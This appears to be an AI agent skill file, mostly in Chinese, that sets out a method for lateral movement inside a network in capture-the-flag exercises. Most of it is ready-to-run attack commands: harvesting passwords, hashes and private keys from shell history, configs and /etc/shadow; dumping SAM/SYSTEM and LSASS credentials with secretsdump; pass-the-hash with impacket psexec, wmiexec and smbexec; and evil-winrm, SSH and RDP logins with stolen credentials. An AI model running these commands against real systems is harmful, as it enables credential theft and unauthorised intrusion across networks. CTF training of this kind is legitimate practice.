---
name: lateral-movement
description: 内网横向移动。Use when you already have a foothold + credentials (password/hash/key/ticket) and need to move to another host to reach the flag. Covers credential extraction, then choosing the right move: SSH (key/password), Windows PTH (psexec/wmiexec/smbexec), WinRM (evil-winrm), RDP, and pass-the-ticket. The flag is usually on a host 1-2 hops deeper — a working credential is the progress marker.
---

# 横向移动方法论

## 1. 先发现目标 + 收集凭据(拿 shell 后第一步)

```bash
arp -a; ip route; cat /etc/hosts          # 已通信主机 / 网段
for p in 22 135 445 3389 5985 8080 8848; do (nc -z -w1 TARGET $p && echo "$p open"); done
cat ~/.bash_history ~/.zsh_history         # 历史命令里常藏 ssh/密码/上一跳
find / -name "*.pem" -o -name "id_rsa" -o -name "*.key" 2>/dev/null
grep -rniE "password|passwd|secret|token" /etc /opt /var/www 2>/dev/null | head -50
cat /etc/passwd; cat /etc/shadow           # 用户 + 密码哈希
# 数据库连接串 / 配置文件里常有下一跳的 host+user+pass
```

## 2. 按凭据类型选移动方式

| 你有 | Linux 目标 | Windows 目标 |
|---|---|---|
| 明文密码 | `sshpass -p PASS user@TARGET` | `evil-winrm -i TARGET -u user -p PASS` |
| 私钥 | `ssh -i id_rsa user@TARGET` | — |
| NTLM 哈希 (PTH) | — | `impacket-psexec/wmiexec/smbexec -hashes :NTHASH DOMAIN/user@TARGET` |
| Kerberos 票据 (PTT) | — | 注入票据后访问服务(见 ad-kerberos skill) |
| 无凭据但有 RCE | 反弹 shell / chisel 隧道 | 反弹 shell / 用立足点代打 |

## 3. Linux 目标

```bash
ssh -i id_rsa -o StrictHostKeyChecking=no user@TARGET
sshpass -p 'PASS' ssh -o StrictHostKeyChecking=no user@TARGET
# 登录后立即: sudo -l、find / -perm -4000(SUID)、看 flag 位置、继续收集下一跳凭据
```

## 4. Windows 目标(impacket 全家桶,Linux 攻击机即可)

```bash
# PTH 远程执行(需要 NTLM hash,不是明文)
impacket-psexec   -hashes :NTHASH DOMAIN/user@TARGET
impacket-wmiexec  -hashes :NTHASH DOMAIN/user@TARGET "whoami"
impacket-smbexec  -hashes :NTHASH DOMAIN/user@TARGET
# WinRM(有明文密码时最快,拿到交互 shell)
evil-winrm -i TARGET -u user -p 'PASS'
# 有明文密码但 RDP: xfreerdp /v:TARGET /u:user /p:PASS
```

## 5. 提取 Windows 凭据(在立足点 Windows 主机上)

```bash
# SAM + SYSTEM(需要管理员)
reg save HKLM\SAM sam; reg save HKLM\SYSTEM sys
impacket-secretsdump -sam sam -system sys LOCAL        # 导出 NTLM hash
# LSASS 内存(域环境拿明文/票据)
impacket-secretsdump DOMAIN/user@TARGET                # 远程 dump
# 之后用导出的 hash 做 PTH(第 4 节),或 hashcat 爆破明文
```

## 6. 纪律

- **拿 shell ≠ 结束**:立即收集凭据(历史/密钥/配置/DB)并扫下一跳,flag 常在第 2-3 跳。
- 记录跳板拓扑(哪个 host 通过哪个凭据/隧道可达),断了链就断了 flag。
- 每跳限时(~15 分钟):一种移动方式失败就换(SSH → WinRM → PTH → 隧道)。
- 优先用**已恢复的凭据**直连,别在每个 hop 重新爆。
